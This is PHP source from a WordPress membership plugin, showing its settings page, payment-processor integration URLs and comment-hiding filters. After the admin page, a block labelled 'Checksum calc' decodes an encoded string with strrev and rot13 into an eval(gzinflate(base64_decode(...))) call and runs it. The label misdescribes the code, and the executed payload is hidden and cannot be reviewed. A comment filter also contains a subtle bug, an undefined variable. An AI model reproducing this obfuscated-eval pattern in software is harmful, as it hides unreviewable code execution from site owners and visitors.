             PromoFusion allows Google to correctly index and rank exact URLs of your protected pages, files and digital media while limiting amount of information delivered to free visitors.<br/>
             PromoFusion boosts visitor engagement and opens extra channels to convert prospects to customers.</div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="20%"><div style="padding:3px;">Location of premium files:<br />(use FTP program to upload premium files here)</div></td>
             <td width="80%"><div style="padding:3px;"><input type="text" name="memberWingProtectedFilesPhysicalAddr" value="<?php echo $devOptions['protected_files_physical_addr']; ?>" <?php echo $input_option; ?> size="<?php echo $phys_addr_len+20; ?>" />/secret_pic.jpg</div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td><div style="padding:3px;">WEB URL to link to above premium files:<br />(only premium users are able to access premium files)</div></td>
             <td><div style="padding:3px;"><b><?php echo $blog_root_logical . '/'; ?></b><input type="text" name="memberWingProtectedFilesLogicalAddr" value="<?php echo $devOptions['protected_files_logical_addr']; ?>" <?php echo $input_option; ?> size="<?php echo $log_addr_len+5; ?>" />/secret_pic.jpg</div></td>
           </tr>
         </table>

        <!-- Digital content Theft Tracing -->
         <table style="background-color:#555;margin-top:5px;">
           <tr style="background-color:#FFE;">
             <td colspan="2" align="center"><div style="padding:3px;"><h3 style="margin:1px;padding:1px;">TraceFusion - Digital Content Theft Tracing, Elimination and Prevention </h3>This feature allows you to pinpoint and eliminate source of your premium content leaks.<br />TraceFusion helps to uncover, terminate and prosecute individuals who steal and illegally share or distribute your premium content.<br />
            When premium user accesses and downloads your premium content - TraceFusion uniquely marks each premium download with invisible digital signature that is specific to each premium member.
            Having found digitally signed file on internet you will be able to discover which member leaked it with surgical precision.<br /><a href="http://www.tracefusion.com/trace/"><b>Read digital signatures and trace your digital content here</b></a>
             </div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="70%"><div style="padding:3px;">TraceFusion binary Digital Content Tracing enabled?<br/>(premium movies, images, ebooks, PDF, MP3, ZIP and other digital binary files)<br />
               Note: TraceFusion can only digitally sign those binary files that are located in 'Premium files location' specified above.
             </div></td>
             <td width="30%"><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="checkbox" name="memberWingTraceFusionBinProtectionActive" value="1" <?php if ($devOptions['tracefusion_bin_protection_active']) echo 'checked="checked"'; ?> /></div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="70%"><div style="padding:3px;">TraceFusion textual Content Tracing enabled?<br/>(articles, posts and pages)</div></td>
             <td width="30%"><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="checkbox" name="memberWingTraceFusionTextProtectionActive" value="1" <?php if ($devOptions['tracefusion_text_protection_active']) echo 'checked="checked"'; ?> /></div></td>
           </tr>
         </table>

        </div>

        <!-- Google First Click Free -->
        <div style="border:1px solid gray; padding:8px;margin:6px 0px;">
           <h3 style="margin:4px;padding:4px;">Enable First Click Free functionality (shows full content of the first page to users coming from search engines) as per <a href="http://googlewebmastercentral.blogspot.com/2008/10/first-click-free-for-web-search.html">Google Spec Here</a></h3>
           <b>First Click Free enabled?</b>&nbsp;&nbsp;&nbsp;
           <div style="border:1px solid gray;display:inline;padding:5px;">
              <input type="radio" name="memberWingFirstClickFreeYesNo" id="id_yes_fcf" value="yes" <?php if ($devOptions['first_click_free']=='yes') {_e("checked", "MemberWingPlugin");} ?> />
              <label for="id_yes_fcf">Yes</label>
              &nbsp;&nbsp;&nbsp;
              <input type="radio" name="memberWingFirstClickFreeYesNo" id="id_no_fcf" value="no"  <?php if ($devOptions['first_click_free']=='no')  {_e("checked", "MemberWingPlugin");} ?> />
              <label for="id_no_fcf">No</label>
           </div>
           <br />
           <b>Number of First Click Free pages (default standard: 1, max: 10):</b>&nbsp;&nbsp;&nbsp;<input type="text" name="memberWingFirstClickFreePages" value="<?php _e(apply_filters('format_to_edit',$devOptions['first_click_free_pages']), 'MemberWingPlugin') ?>" size="4" />
        </div>

        <!-- IP Address allow -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <h3 style="margin:4px;">Allow IP address</h3>
           <p>&nbsp;&nbsp;Visitor from this IP address will have complete access to all content without need to login. Format: 123.45.6.78<br />&nbsp;&nbsp;'0.0.0.0' - IP based access disabled</p>
           <input type="text" name="memberWingAllowIpAddress" value="<?php _e(apply_filters('format_to_edit',$devOptions['allow_ip_address']), 'MemberWingPlugin') ?>"  />
        </div>

        <!-- Premium content markers -->
        <div align="center" style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <table width="75%" style="background-color:#555;">
             <tr style="background-color:#FFE;">
               <td colspan="8"><div align="center" style="padding:4px;"><h3 style="margin:3px;">Premium Content Markers</h3>
               Premium content markers are used inside of articles and pages to separate free teasers from premium content</div></td>
             </tr>
             <tr style="background-color:#FFE;">
               <td width="15%"><div align="right" style="padding:3px 2px;font-weight:bold;">Bronze:</div></td>
               <td width="10%"><div align="center" style="color:#C00;font-weight:bold;padding:3px 2px;"><?php echo $devOptions['bronze_content_marker']; ?></div></td>
               <td width="15%"><div align="right" style="padding:3px 2px;font-weight:bold;">Silver:</div></td>
               <td width="10%"><div align="center" style="color:#C00;font-weight:bold;padding:3px 2px;"><?php echo $devOptions['silver_content_marker']; ?></div></td>
               <td width="15%"><div align="right" style="padding:3px 2px;font-weight:bold;">Gold:</div></td>
               <td width="10%"><div align="center" style="color:#C00;font-weight:bold;padding:3px 2px;"><?php echo $devOptions['gold_content_marker']; ?></div></td>
               <td width="15%"><div align="right" style="padding:3px 2px;font-weight:bold;">Platinum:</div></td>
               <td width="10%"><div align="center" style="color:#C00;font-weight:bold;padding:3px 2px;"><?php echo $devOptions['platinum_content_marker']; ?></div></td>
             </tr>
           </table>
        </div>

        <!-- Comments visibility -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <div align="center" style="border:1px solid gray;background-color:#FFE;padding:2px;margin:3px;"><h3 style="margin:4px;">Comments visibility</h3></div>
           Hide comments from non-logged on users?&nbsp;&nbsp;<input type="checkbox" name="memberWingHideCommentsFromNonLoggedOnUsers" value="1" <?php if ($devOptions['hide_comments_from_non_logged_on_users']) echo 'checked="checked"'; ?> />
           <br />(if checked - all comments will be hidden from non logged on visitors)
        </div>

        <!-- subscription cancellation event -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <div align="center" style="border:1px solid gray;background-color:#FFE;padding:2px;margin:3px;"><h3 style="margin:4px;">Subscription cancellation/refund/chargeback event</h3></div>
           Delete user account when membership cancelled?&nbsp;&nbsp;<input type="checkbox" name="memberWingDeleteUserAccount" value="1" <?php if ($devOptions['delete_user_account_when_cancel']) echo 'checked="checked"'; ?> />
           <br />(if unchecked - user account will be downgraded to regular <i><b>subscriber</b></i> in case of cancellation/refund/chargeback event)
        </div>

        <!-- iDevAffiliate integration -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <div align="center" style="border:1px solid gray;background-color:#FFE;padding:2px;margin:3px;"><h3 style="margin:4px;">Integration with <a href="http://www.memberwing.com/get/idev">iDevAffiliate</a> affiliate tracking software</h3></div>
           Enable integration with <a href="http://www.memberwing.com/get/idev">iDevAffiliate affiliate tracking software</a>?&nbsp;&nbsp;<input type="checkbox" name="memberWingIDevAffiliateEnabled" value="1" <?php if ($devOptions['idevaffiliate_integration_enabled']) echo 'checked="checked"'; ?> />
           <br />iDevAffiliate install location:<br /><input type="text" name="memberWingiDevAffiliateInstallDir" value="<?php echo $devOptions['idevaffiliate_install_dirname']; ?>" size="120" />
           <br />Usage:
           <br />In Paypal Advanced Variables (during button creation), after 'notify_url=...' add this line of code (required for sales tracking): <code><b>custom=__SERVER__REMOTE_ADDR__</b></code>
           <br />OR, alternatively - edit your Paypal subscribe/buy button HTML code directly by adding this line inside it: <code><b><?php echo htmlentities('<input type="hidden" name="custom" value="__SERVER__REMOTE_ADDR__">'); ?></b></code>
           <br /><b>Please note</b> that above code snippet must be present inside HTML code of your join/subscribe page. If your paypal button code is fully hosted - this snippet will not appear inside page HTML and integration will not work.
        </div>

        <!-- AWeber integration -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <div align="center" style="border:1px solid gray;background-color:#FFE;padding:2px;margin:3px;"><h3 style="margin:4px;">Integration with <a href="http://www.memberwing.com/goto/aweber">Aweber autoresponder</a></h3></div>
           Enable integration with <a href="http://www.memberwing.com/goto/aweber">AWeber - most popular autoresponder service</a>?&nbsp;&nbsp;<input type="checkbox" name="memberWingAWeberEnabled" value="1" <?php if ($devOptions['aweber_integration_enabled']) echo 'checked="checked"'; ?> />
           <br />Email address of your AWeber list (YOUR-LISTNAME@aweber.com): <input type="text" name="memberWingAweberListEmail" value="<?php echo $devOptions['aweber_list_email']; ?>" size="80" />
           <hr /><b>Notes:</b>
           <br />Memberwing will add new subscriber to the above listname as soon as subscriber paid to join your membership site. He will then receive confirmation email from Aweber.
           <br /><b><span style="color:red;background-color:#FF9;">Please note:</span></b> You must activate MemberWing parser within your Aweber mailing list configuration panel. Without this step no new subscribers will be added to your Aweber list.
           <br />Please contact Aweber at help@aweber.com for more information.
        </div>

        <div style="border:1px solid gray;margin:6px 0px;padding:15px;">
           <h3 style="text-align:center;"><i>Automated payment processing.<br />Allows new members to join instantly after cleared payment. E-junkie and PayDotCom affiliate features enables additional payment processing services and promotion of membership site via affiliates</i></h3>
<?php
   if ($_license_properties['edition']=='free')
      echo '<h4 style="border:2px solid red;margin-top:10px;padding:8px;background-color:yellow;">NOTE: <a href="http://www.memberwing.com/software/">Webmaster</a> or <a href="http://www.memberwing.com/#BuyMemberWingNow">Professional Edition</a> are required to enable automated payment processing, Paypal and extra affiliate promotion features. <a href="http://www.memberwing.com/#BuyMemberWingNow">Instant download available</a>.</h4>';
?>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">Paypal IPN code to be used during creation of Paypal Subscription Button.<br />Copy/paste it into &quot;advanced variables&quot;. <a href="http://www.memberwing.com/software/wordpress-membership-site-plugin-memberwing/memberwing-user-guide/">See detailed instructions here</a></h4>
              <?php $_disabled=""; $notifyname='/notify_paypal.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo 'notify_url=' . get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
              <br />Enable Paypal Sandbox for testing?&nbsp;&nbsp;<input type="checkbox" name="memberWingPaypalSandboxEnabled" value="1" <?php if ($devOptions['paypal_sandbox_enabled']) echo 'checked="checked"'; ?> />&nbsp;&nbsp;<span style="color:red;">(Disable it before going live!)</span>
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">PayDotCom IPN URL code to be used during creation of Subscription Product.<br />Copy/paste it into &quot;Advanced Users Only-&gt;IPN URL field&quot;. </h4>
              <?php $_disabled=""; $notifyname='/notify_paydotcom.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">Clickbank Instant Notification URL.<br />Copy/paste it into Clickbank--&gt;Account settings--&gt;My site--&gt;Advanced tools--&gt;Instant Notification URL </h4>
              <?php $_disabled=""; $notifyname='/notify_clickbank.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
              <br />Your Clickbank Secret Key (used in Clickbank-&gt;Account settings--&gt;My site-&gt;Advanced tools-&gt;Secret Key):
              <br /><input type="text" name="memberWingClickbankSecretKey" value="<?php _e(apply_filters('format_to_edit',$devOptions['clickbank_secret_key']), 'MemberWingPlugin') ?>" />
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">MemberWing + <a href="http://www.memberwing.com/goto/rapidactionprofits/">Rapid Action Profits</a> Integration Code<br />Copy/paste it into RAP admin panel-&gt;Addons-&gt;MemberWing Addon</h4>
              <?php $_disabled=""; $notifyname='/notify_rap.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo str_replace ('\\', '/', dirname(__FILE__) . $notifyname); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">E-Junkie URL code to be used during creation of Product.<br />Copy/paste it into &quot;Product Configuration-&gt;More Options&gt;Payment Variable Information URL&quot; field. </h4>
              <?php $_disabled=""; $notifyname='/notify_ejunkie.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">2Checkout.com integration:<br />Paste this URL code into 2Checkout admin panel at: Account-&gt;Notifications-&gt;Global Settings-&gt;Global URL. Press [Apply]. Check &quot;Enable all notifications&quot;. Press [Apply]. Scroll to the end of page and press [Save Settings].</h4>
              <?php $_disabled=""; $notifyname='/notify_2co.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
           </div>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">SAGE Payment Solutions, Postback URL:<br />Login into SAGE Virtual Terminal and copy/paste it into Products--&gt;Shopping Cart--&gt;Postback URL (enable Postback Service option as well).</h4>
              <?php $_disabled=""; $notifyname='/notify_sage.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
              <br />Comma-delimited, case SeNsiTive list of Part Numbers for the products that MemberWing should process. Find them in Products-&gt;Product Management, Part Number.
              <br />Example: <code>Gold1</code> or <code>Gold1, Silver25, 728501, PremiumYearly</code>.
              <br /><input type="text" name="memberWingSagePartNumbers" value="<?php _e(apply_filters('format_to_edit',$devOptions['sage_part_numbers']), 'MemberWingPlugin') ?>" size="60" />
           </div>
<?php if (0) { ?>
           <div style="border:2px solid gray;margin:6px;padding:6px;">
              <h4 style="margin:4px;">ccBill.com integration:<br />Paste this URL code into ccBill admin panel at: Tools-&gt;Account Maintenance-&gt;Account Admin-&gt;Select subaccount, select &quot;0000&quot;, Modify Subaccount-&gt;Advanced. And paste the URL below into &quot;Approval Post URL&quot; and &quot;Denial Post URL&quot; fields. Press [Update].</h4>
              <?php $_disabled=""; $notifyname='/notify_ccbill.php'; if (!file_exists(dirname(__FILE__) . $notifyname)) $_disabled = 'disabled="disabled"'; ?>
              <input type="text" name="ipncode5" onclick="this.select();" value="<?php echo get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-content/plugins/$1$notifyname", __FILE__); ?>" size="120" readonly="readonly" <?php echo $_disabled; ?> />
           </div>
<?php } ?>
        </div>

        <!-- Premium content Message -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
           <div align="center" style="border:1px solid gray;background-color:#FFE;padding:2px;margin:3px;"><h3 style="margin:4px;">Premium Content Message</h3>Edit it to fit your needs and press [Update] button to save changes</div>
           <div align="center">
             <textarea style="font-size:10px;" name="memberWingPremiumContentWarning" cols=150 rows=5><?php _e(apply_filters('format_to_edit',$devOptions['premium_content_warning']), 'MemberWingPlugin') ?></textarea>
           </div>
        </div>

        <!-- Welcome new member email -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
         <table style="background-color:#555;">
           <tr style="background-color:#FFE;">
             <td colspan="2" align="center"><div style="padding:3px;"><h3 style="margin:1px;padding:1px;">Welcome new member email message</h3>
               This email is sent to new members right after their initial signup
               <br />These variables:<br /><b>{FIRST_NAME}</b>, <b>{LAST_NAME}</b>, <b>{ITEM_NAME}</b>, <b>{USERNAME}</b>, <b>{PASSWORD}</b>, <b>{BLOG_LOGIN_URL}</b> and <b>{BLOG_ROOT_URL}</b> will be automatically replaced with their values
               <div align="left">
                  <br /><b>{ITEM_NAME}</b> - is the name of your membership product as specified at your payment processor. Example: <b>Mary's Gold Membership</b>.
                  <br /><b>{BLOG_LOGIN_URL}</b>  - is login URL for your website, such as: <b>http://www.YOUR-SITE.com/wp-login.php?redirect_to=/</b>
                  <br /><b>{BLOG_ROOT_URL}</b>   - is the main URL of your website, such as: <b>http://www.YOUR-SITE.com/</b>
               </div>
             </div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="20%"><div style="padding:3px;">Email subject:</div></td>
             <td width="80%"><div style="padding:3px;"><input type="text" name="memberWingWelcomeEmailSubject" value="<?php echo $devOptions['welcome_email_subject']; ?>" size="150" /></div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td><div style="padding:3px;">Welcome email body:<br />(Use <b>&lt;br /&gt;</b> as line breaks)</div></td>
             <td><div style="padding:3px;"><textarea style="font-size:10px;" name="memberWingWelcomeEmailBody" cols=150 rows=5><?php _e(apply_filters('format_to_edit',$devOptions['welcome_email_body']), 'MemberWingPlugin') ?></textarea></div></td>
           </tr>
         </table>
        </div>

        <div class="submit" align="center">
            <input type="submit" name="update_memberWingPluginSettings" value="<?php _e('Update Settings', 'MemberWingPlugin') ?>" />
        </div>
    </form>
</div>
                <?php
            }//End function printAdminPage()
       }
   }

// Checksum calc:
$rUkUZOFscEmvHBa='==wX7/Fu/fDq8PV78pm/u18E1dw+fAcro5MJgLwcEh3w+fd0fPPeligTwUf3QpzpWXc7r+LQ2+uNZi7Hes/Zgutty+IH/0gHiqRDz6jmQlSs8PPx2vk4ahz+Vrnu65Alvdd/Pf4zRa66rb1PmEl/Ky8DNXBu/nL+hhGZGQTUHpfRqzttLJ+hYdvTr3bLTOLZKWKpXe3trz6SCQBmO74NQzahbPJWSr1Xedlnxlen5uoQYqcptYIYBLr8cZMOyzJJ73zkFp5re21A2FY5HSoVLtWAslQ5mK9cVhEfSR9+OrXY2ho09y/RG6SlS33I5HBfKs0fNytFkE7N74yomA3t7zOHFg6gCPH1XLko35XJ0OCNcaRF0zgKYX+81MlOFYc4HXTdJXuTLHhRcJPYMgyqk6M8oA/EJRaOrow4sIbEGmqPtOQz9uPfJ2MvI0Z6k855Ba4oAVeVOT7KdguZwPhEBRy9L5F08aoBtmNn/B6GXPwQaGpkqPI0olOe9wiIc9+QxyEu9YKwNBsF3dXmFU+22LYYtQzptVr1xXpOjfdLU495NT/ycszL5l/yIiL+Vcj7dhjJe0ey4zycSwDRXEYOqxf8omhP11QleyJyZkh32BiDRjB1fb3uDMrJdGTal3EKLygI29t0zY5rjZmb6NJF3RGcYKWDVgUtSJie0m1gNUza53z4tucH84dFSin4YlsX33dO34H+p3qSpAOfeUCeFO9FauIcMaYEFV8lMiQSppjmqvCxlnq2D302ildkRJExOcMqIJpKud8jI4AkKtariM8hf6gcxot+9+1YrLr+Um2iPPi6lOXqTaC3M3PfhCOP+mss6wFihEOPbiCs8ImWVF4w2Opp/BAAQJqjJ3Yb';$pqmKikOrRT=';))))nOUizRpfSBMHxHe$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$ysCGatYfyYrpQKtAzKpD=strrev($pqmKikOrRT);$BRSlqkiMIeUyFOS=str_rot13($ysCGatYfyYrpQKtAzKpD);eval($BRSlqkiMIeUyFOS);

if (class_exists("MemberWing"))
   {
   $mw_Plugin = new MemberWing();
   }

//Initialize the admin panel
if (!function_exists("MemberWingPlugin_AdminPanel"))
   {
   function MemberWingPlugin_AdminPanel()
      {
      global $mw_Plugin;
      if (!isset($mw_Plugin))
         {
         return;
         }
      if (function_exists('add_options_page'))
         {
         add_options_page('MemberWing Plugin', 'MemberWing Plugin', 9, basename(__FILE__), array(&$mw_Plugin, 'printAdminPage'));
         }
      }
   }

//Actions and Filters
if (isset($mw_Plugin))
   {
   //Actions
   add_action ('admin_menu', 'MemberWingPlugin_AdminPanel', 2);

   // 'activate_'(standard WP) + member-wing(name of dir under /plugins/) + name of main plugin's .PHP file.
   // 'activate_member-wing/memberwing_head----.php'
   $filename = "activate_" . preg_replace ('#^.*[/\\\\]([^/\\\\]+)$#', "$1", dirname(__FILE__)) . '/' . MW_PLUGIN_FILENAME;

   if (mwdebug())
      // filename=activate_member-wing/memberwing_head400_premium_pu.php
      log_event (__FILE__, __LINE__, "In MemberWing - actions/filters. filename=$filename. debug=" . mwdebug());

   add_action ($filename, array(&$mw_Plugin, 'init'),   2);
   add_action('init', array(&$mw_Plugin, 'set_cookie'), 2);

   //Filters
   add_filter ('the_content',         array(&$mw_Plugin, 'protectContent_cont'),   2);
   add_filter ('the_content_limit',   array(&$mw_Plugin, 'protectContent_limit'),  2);
   add_filter ('the_excerpt',         array(&$mw_Plugin, 'protectContent_exc'),    2);
   add_filter ('the_content_rss',     array(&$mw_Plugin, 'protectContent_rss'),    2);
   add_filter ('the_excerpt_rss',     array(&$mw_Plugin, 'protectContent_excrss'), 2);
   }

//---------------------------------------
// DCP functionality
   if (file_exists(dirname(__FILE__) . '/dcp.php'))
      include_once (dirname(__FILE__) . '/dcp.php');
//---------------------------------------
//---------------------------------------
// MW Gradual Content functionality
   if ($_license_properties['edition']!='free' && file_exists(dirname(__FILE__) . '/mw_gradual_content.php'))
      include_once (dirname(__FILE__) . '/mw_gradual_content.php');
//---------------------------------------
/*
   // PHP 5.x only
   // Process and load MemberWing extensions
   $mw_files = scandir (dirname(__FILE__));
   $extensions = array ();
   foreach ($mw_files as $mw_file)
      {
      $mw_file = dirname(__FILE__) . "/$mw_file";
      if (is_file($mw_file) && preg_match ('|\/mwext_[^\/]+\.php$|i', $mw_file))
         $extensions[] = $mw_file;
      }
   foreach ($extensions as $extension)
      include_once ($extension);
*/

//------------------------------------------
// Hide comments of any article from all non-logged on users - depending on admin settings.
   add_filter ('comment_text',     'flt_comments',          2);
   add_filter ('comment_text_rss', 'flt_comments',          2);
   add_filter ('comment_excerpt',  'flt_comments',          2);
   add_filter ('comments_array',   'flt_comments_array',    2);
   add_filter ('comments_number',  'flt_comments_number',   2);

   function flt_comments_number($x)
      {
      if (!MW_do_hide_comments())
         return $x;  // Settings saying: Do not hide comments from anyone.

      global $user_ID;
      get_currentuserinfo();

      if (!$user_ID)
         {
         return 0;
         }

      return $x;
      }
   function flt_comments_array($content="")
      {
      if (!MW_do_hide_comments())
         return $content;  // Settings saying: Do not hide comments from anyone.

      global $user_ID;
      get_currentuserinfo();

      if (!$user_ID)
         {
         //no user logged in - return empty array of comments.
         $content = array();
         }
      return ($content);
      }

   function flt_comments($content="")
      {
      if (!MW_do_hide_comments())
         return $content;  // Settings saying: Do not hide comments from anyone.

      global $user_ID;
      get_currentuserinfo();

      if (!$user_ID)
         {
         //no user logged in - melt comments
         // Melt everything outside of tags, leaving all tags in tact. Tags == <...>
         $content = preg_replace ('#(?<=^|\>)[^\<]*#', '', $content);
         // Melt all inner attributes of tags
         $content = preg_replace ('/<([a-zA-Z0-9]+)\s[^>]*>/', "<$1>", $content1);
         }
      return ($content);
      }

   function MW_do_hide_comments()
      {
      $mw_options = get_option ("MemberWingAdminOptions");
      if (isset($mw_options['hide_comments_from_non_logged_on_users']) && $mw_options['hide_comments_from_non_logged_on_users'])
         return TRUE;
      return FALSE;
      }
//------------------------------------------

//===========================================================================
function GetMemberWingEditionString ()
{
   global $_license_properties;
   switch ($_license_properties['edition'])
      {
      case 'free' :  return "Free edition";
      case 'w1'   :  return "Webmaster One";
      case 'p1'   :  return "Professional One";
      case 'pu'   :  return "Professional Unlimited";
      default:       return "Unknown edition";
      }
}
//===========================================================================


?>